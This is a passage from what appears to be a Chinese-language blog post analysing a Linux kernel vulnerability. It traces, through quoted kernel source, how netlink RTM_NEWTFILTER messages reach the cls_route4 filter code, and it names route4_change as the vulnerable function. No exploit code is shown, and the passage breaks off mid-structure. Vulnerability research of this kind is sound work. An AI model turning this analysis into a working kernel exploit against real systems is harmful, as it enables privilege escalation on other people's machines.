link-&gt;owner = owner;</span><br><span class="line"></span><br><span class="line">	WARN_ON(doit &amp;&amp; link-&gt;doit &amp;&amp; link-&gt;doit != doit);</span><br><span class="line">	<span class="keyword">if</span> (doit)</span><br><span class="line">		link-&gt;doit = doit;</span><br><span class="line">	WARN_ON(dumpit &amp;&amp; link-&gt;dumpit &amp;&amp; link-&gt;dumpit != dumpit);</span><br><span class="line">	<span class="keyword">if</span> (dumpit)</span><br><span class="line">		link-&gt;dumpit = dumpit;</span><br><span class="line"></span><br><span class="line">	link-&gt;flags |= flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* publish protocol:msgtype */</span></span><br><span class="line">	rcu_assign_pointer(tab[msgindex], link);</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (old)</span><br><span class="line">		kfree_rcu(old, rcu);</span><br><span class="line">unlock:</span><br><span class="line">	rtnl_unlock();</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>涉及到的结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> &#123;</span></span><br><span class="line">	rtnl_doit_func		doit;</span><br><span class="line">	rtnl_dumpit_func	dumpit;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span>		*<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		flags;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>有个全局指针数组<code>static struct rtnl_link __rcu *__rcu *rtnl_msg_handlers[RTNL_FAMILY_MAX + 1];</code>，他其实是一个二重指针，第一重指针的下标是消息类型，第二重下标是消息的type,所以每一个消息类型的每一个type都对应一个<code>struct rtnl_link</code>结构体。</p>
<p>除了<code>rtnetlink_init</code>会注册消息的操作之外，<code>tc_filter_init</code>也会注册一些消息的操作,其中<code>RTM_NEWTFILTER</code>这个类型就是添加一个流量过滤器，他只有<code>doit</code>操作，函数为<code>tc_new_tfilter()</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">tc_filter_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tc_filter_wq = alloc_ordered_workqueue(<span class="string">&quot;tc_filter_workqueue&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!tc_filter_wq)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	err = register_pernet_subsys(&amp;tcf_net_ops);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">goto</span> err_register_pernet_subsys;</span><br><span class="line"></span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWTFILTER, tc_new_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELTFILTER, tc_del_tfilter, <span class="literal">NULL</span>,</span><br><span class="line">		      RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETTFILTER, tc_get_tfilter,</span><br><span class="line">		      tc_dump_tfilter, RTNL_FLAG_DOIT_UNLOCKED);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_NEWCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_DELCHAIN, tc_ctl_chain, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	rtnl_register(PF_UNSPEC, RTM_GETCHAIN, tc_ctl_chain,</span><br><span class="line">		      tc_dump_chain, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_register_pernet_subsys:</span><br><span class="line">	destroy_workqueue(tc_filter_wq);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在稍微理清了每个消息类型的每个type如何在内核中组织存储，那该如何调用这些消息的操作函数呢，比如说<code>RTM_NEWTFILTE</code>的<code>doit</code>.</p>
<p>当用户进程通过<code>NETLINK_ROUTE</code>创建套接字并且发送<code>RTM_NEWTFILTER</code>消息用于创建一个流量过滤器时,内核会调用<code>rtnetlink_rcv_msg()</code>函数来处理rtnetlink消息。</p>
<p><code>struct nlmsghdr *nlh</code>这个结构体在学习netlink的时候就已经见过了,其中<code>family</code>就是消息类型也就是<code>protocol</code>,type就是<code>msgtype</code>，然后调用<code>link = rtnl_get_link(family, type);</code>获得对应的<code>link</code>.获得了<code>link</code>后就调用<code>link-&gt;doit()</code>函数，进而调用到了<code>tc_new_tfilter()</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rtnetlink_rcv_msg</span><span class="params">(struct sk_buff *skb, struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">			     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> sock_net(skb-&gt;sk);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rtnl_link</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err = -EOPNOTSUPP;</span><br><span class="line">	rtnl_doit_func doit;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">int</span> kind;</span><br><span class="line">	<span class="keyword">int</span> family;</span><br><span class="line">	<span class="keyword">int</span> type;</span><br><span class="line"></span><br><span class="line">	type = nlh-&gt;nlmsg_type;</span><br><span class="line">	<span class="keyword">if</span> (type &gt; RTM_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">	type -= RTM_BASE;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* All the messages must have at least 1 byte length */</span></span><br><span class="line">	<span class="keyword">if</span> (nlmsg_len(nlh) &lt; <span class="keyword">sizeof</span>(struct rtgenmsg))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	family = ((struct rtgenmsg *)nlmsg_data(nlh))-&gt;rtgen_family;</span><br><span class="line">	kind = type&amp;<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kind != <span class="number">2</span> &amp;&amp; !netlink_net_capable(skb, CAP_NET_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	rcu_read_lock();</span><br><span class="line">	<span class="keyword">if</span> (kind == <span class="number">2</span> &amp;&amp; nlh-&gt;nlmsg_flags&amp;NLM_F_DUMP) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">rtnl</span>;</span></span><br><span class="line">		rtnl_dumpit_func dumpit;</span><br><span class="line">		u32 min_dump_alloc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		link = rtnl_get_link(family, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;dumpit) &#123;</span><br><span class="line">			family = PF_UNSPEC;</span><br><span class="line">			link = rtnl_get_link(family, type);</span><br><span class="line">			<span class="keyword">if</span> (!link || !link-&gt;dumpit)</span><br><span class="line">				<span class="keyword">goto</span> err_unlock;</span><br><span class="line">		&#125;</span><br><span class="line">		owner = link-&gt;owner;</span><br><span class="line">		dumpit = link-&gt;dumpit;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (type == RTM_GETLINK - RTM_BASE)</span><br><span class="line">			min_dump_alloc = rtnl_calcit(skb, nlh);</span><br><span class="line"></span><br><span class="line">		err = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/* need to do this before rcu_read_unlock() */</span></span><br><span class="line">		<span class="keyword">if</span> (!try_module_get(owner))</span><br><span class="line">			err = -EPROTONOSUPPORT;</span><br><span class="line"></span><br><span class="line">		rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">		rtnl = net-&gt;rtnl;</span><br><span class="line">		<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">				.dump		= dumpit,</span><br><span class="line">				.min_dump_alloc	= min_dump_alloc,</span><br><span class="line">				.<span class="keyword">module</span>		= owner,</span><br><span class="line">			&#125;;</span><br><span class="line">			err = netlink_dump_start(rtnl, skb, nlh, &amp;c);</span><br><span class="line">			<span class="comment">/* netlink_dump_start() will keep a reference on</span></span><br><span class="line"><span class="comment">			 * module if dump is still in progress.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			module_put(owner);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (!link || !link-&gt;doit) &#123;</span><br><span class="line">		family = PF_UNSPEC;</span><br><span class="line">		link = rtnl_get_link(PF_UNSPEC, type);</span><br><span class="line">		<span class="keyword">if</span> (!link || !link-&gt;doit)</span><br><span class="line">			<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	owner = link-&gt;owner;</span><br><span class="line">	<span class="keyword">if</span> (!try_module_get(owner)) &#123;</span><br><span class="line">		err = -EPROTONOSUPPORT;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	flags = link-&gt;flags;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; RTNL_FLAG_DOIT_UNLOCKED) &#123;</span><br><span class="line">		doit = link-&gt;doit;</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">		<span class="keyword">if</span> (doit)</span><br><span class="line">			err = doit(skb, nlh, extack);</span><br><span class="line">		module_put(owner);</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">	rtnl_lock();</span><br><span class="line">	link = rtnl_get_link(family, type);</span><br><span class="line">	<span class="keyword">if</span> (link &amp;&amp; link-&gt;doit)</span><br><span class="line">		err = link-&gt;doit(skb, nlh, extack);</span><br><span class="line">	rtnl_unlock();</span><br><span class="line"></span><br><span class="line">	module_put(owner);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err_unlock:</span><br><span class="line">	rcu_read_unlock();</span><br><span class="line">	<span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面继续分析<code>tc_new_tfilter()</code>函数,这个函数代码较多就不摆出来了，主要看一下关键代码</p>
<p>在看关键代码之前首先要搞清楚一个数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> &#123;</span></span><br><span class="line">	__u16           nla_len;</span><br><span class="line">	__u16           nla_type;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个是<code>netlink</code>一般的数据段格式，图示如下。</p>
<p><img src="https://e-mailky.github.io/images/kernel/23069658_1352297396Tqc4.jpg" alt="T5"></p>
<p>一个<code>nlattr</code>+<code>value</code>就相当于一个数据段的字段了。其中<code>length</code>是nlattr+value的总长度。<code>tc_new_tfilter()</code>函数首先初始化了变量<code>struct nlattr *tca[TCA_MAX + 1]</code>,他是一个结构体指针数组。数组中的每个指针都指向了一个用户进程传进来的字段的首地址。</p>
<p>获取每一个字段之后，后面就是对字段的解析了，首先是从字段中获取过滤器的名字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tcf_proto_check_kind(tca[TCA_KIND], name)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Specified TC filter name too long&quot;</span>);</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后是根据chainidx(可控)获取chain,然后根据chain获取一个tp(struct tcf_proto),</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_find(chain, &amp;chain_info, protocol,</span><br><span class="line">			       prio, prio_allocate);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">		NL_SET_ERR_MSG(extack, <span class="string">&quot;Filter with specified priority/protocol not found&quot;</span>);</span><br><span class="line">		err = PTR_ERR(tp);</span><br><span class="line">		<span class="keyword">goto</span> errout_locked;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>如果tp不存在还会根据过滤器名称<code>name</code>调用<code>tcf_proto_create(</code>创建一个新的<code>tp</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tp_new = tcf_proto_create(name, protocol, prio, chain,</span><br><span class="line">					  rtnl_held, extack);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp_new)) &#123;</span><br><span class="line">			err = PTR_ERR(tp_new);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct tcf_proto *<span class="title">tcf_proto_create</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *kind, u32 protocol,</span></span></span><br><span class="line"><span class="params"><span class="function">					  u32 prio, struct tcf_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">					  <span class="keyword">bool</span> rtnl_held,</span></span></span><br><span class="line"><span class="params"><span class="function">					  struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto</span> *<span class="title">tp</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	tp = kzalloc(<span class="keyword">sizeof</span>(*tp), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!tp)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOBUFS);</span><br><span class="line"></span><br><span class="line">	tp-&gt;ops = tcf_proto_lookup_ops(kind, rtnl_held, extack);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(tp-&gt;ops)) &#123;</span><br><span class="line">		err = PTR_ERR(tp-&gt;ops);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	tp-&gt;classify = tp-&gt;ops-&gt;classify;</span><br><span class="line">	tp-&gt;protocol = protocol;</span><br><span class="line">	tp-&gt;prio = prio;</span><br><span class="line">	tp-&gt;chain = chain;</span><br><span class="line">	spin_lock_init(&amp;tp-&gt;lock);</span><br><span class="line">	refcount_set(&amp;tp-&gt;refcnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	err = tp-&gt;ops-&gt;init(tp);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		module_put(tp-&gt;ops-&gt;owner);</span><br><span class="line">		<span class="keyword">goto</span> errout;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tp;</span><br><span class="line"></span><br><span class="line">errout:</span><br><span class="line">	kfree(tp);</span><br><span class="line">	<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>tcf_proto_create()</code>中会根据<code>name</code>即<code>kind</code>调用函数<code>tcf_proto_lookup_ops()</code>获得对应的<code>ops</code>,内核本来就有一些<code>ops</code>，查找对应ops的原理就是对比<code>kind==ops-&gt;kind</code>，如果等于那就返回这个ops的首地址。</p>
<p>比如如果传入的<code>kind=&quot;route&quot;</code>就会返回这样的<code>ops</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcf_proto_ops</span> <span class="title">cls_route4_ops</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">	.kind		=	<span class="string">&quot;route&quot;</span>,</span><br><span class="line">	.classify	=	route4_classify,</span><br><span class="line">	.init		=	route4_init,</span><br><span class="line">	.destroy	=	route4_destroy,</span><br><span class="line">	.get		=	route4_get,</span><br><span class="line">	.change		=	route4_change,</span><br><span class="line">	.<span class="keyword">delete</span>		=	route4_delete,</span><br><span class="line">	.walk		=	route4_walk,</span><br><span class="line">	.dump		=	route4_dump,</span><br><span class="line">	.bind_class	=	route4_bind_class,</span><br><span class="line">	.owner		=	THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>然后初始化<code>tp</code>的一些字段。</p>
<p>最后调用<code>tp-&gt;ops-&gt;init</code>即<code>route4_init</code>函数，这个函数创建了一个<code>rout4_head</code>结构体用于存放过滤器对应的哈希值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">route4_init</span><span class="params">(struct tcf_proto *tp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> *<span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line">	head = kzalloc(<span class="keyword">sizeof</span>(struct route4_head), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> -ENOBUFS;</span><br><span class="line"></span><br><span class="line">	rcu_assign_pointer(tp-&gt;root, head);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后返回到<code>tc_new_tfilter</code>函数中，把新创建并且初始化的<code>tp</code>插入到<code>chain</code>中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tp = tcf_chain_tp_insert_unique(chain, tp_new, protocol, prio,</span><br><span class="line">						rtnl_held);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(tp)) &#123;</span><br><span class="line">			err = PTR_ERR(tp);</span><br><span class="line">			<span class="keyword">goto</span> errout_tp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mutex_unlock(&amp;chain-&gt;filter_chain_lock);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>然后调用<code>tp-&gt;ops-&gt;get</code>即<code>route4_get()</code></p>
<p>根据handle从route4_head链表中获取对应的route4_filter。如果为空且<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>存在或者不为空但<code>n-&gt;nlmsg_flags &amp; NLM_F_CREATE)</code>不存在则调用<code>tp-&gt;ops-&gt;change</code>即<code>rout4_change</code>创建</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">err = tp-&gt;ops-&gt;change(net, skb, tp, cl, t-&gt;tcm_handle, tca, &amp;fh,</span><br><span class="line">			      flags, extack);</span><br><span class="line">	<span class="keyword">if</span> (err == <span class="number">0</span>) &#123;</span><br><span class="line">		tfilter_notify(net, skb, n, tp, block, q, parent, fh,</span><br><span class="line">			       RTM_NEWTFILTER, <span class="literal">false</span>, rtnl_held);</span><br><span class="line">		tfilter_put(tp, fh);</span><br><span class="line">		<span class="comment">/* q pointer is NULL for shared blocks */</span></span><br><span class="line">		<span class="keyword">if</span> (q)</span><br><span class="line">			q-&gt;flags &amp;= ~TCQ_F_CAN_BYPASS;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>rout4_change()</code>就是漏洞产生的模块。</p>
<p>硬着头皮看了半个晚上的代码终于大概搞懂了相关的结构体的关系以及漏洞原因。</p>
<p>首先是有一个结构体<code>chain</code>,这个结构体记录了一个<code>tp</code>的链表，然后<code>tc_new_tfilter()</code>函数根据用户传进来的一些参数确定一个<code>tp</code>如果找不到这个<code>tp</code>那就创建一个新的<code>tp</code>，关键的是还会创建一个新的<code>route4_head</code>,记录在这个新<code>tp</code>的字段里，这个<code>route4_head</code>就是一个哈希桶，主要记录<code>route4_filter</code>结构体，<code>route4_head</code>结构体如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_head</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_fastmap</span>		<span class="title">fastmap</span>[16];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> __<span class="title">rcu</span>	*<span class="title">table</span>[256 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_bucket</span> &#123;</span></span><br><span class="line">	<span class="comment">/* 16 FROM buckets + 16 IIF buckets + 1 wildcard bucket */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">ht</span>[16 + 16 + 1];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>			<span class="title">rcu</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">route4_filter</span> __<span class="title">rcu</span>	*<span class="title">next</span>;</span></span><br><span class="line">	u32			id;</span><br><span 